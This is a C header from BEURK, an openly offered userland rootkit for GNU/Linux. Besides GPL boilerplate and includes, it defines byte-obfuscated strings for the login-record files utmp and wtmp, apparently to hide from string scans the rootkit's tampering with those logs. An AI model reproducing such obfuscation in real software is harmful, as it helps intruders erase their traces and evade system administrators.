/*
 * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
 * Copyright (C) 2015  unix-thrust
 *
 * This file is part of BEURK.
 *
 * BEURK is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * BEURK is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
 */

#pragma once

#include "hooks.h"
#include "config.h"
#include "debug.h"

#define UTMP_FILE "\xd1\x88\x9f\x8c\xd1\x92\x91\x99\xd1\x8b\x8a\x93\x8e"
#define WTMP_FILE "\xd1\x88\x9f\x8c\xd1\x92\x91\x99\xd1\x89\x8a\x93\x8e"
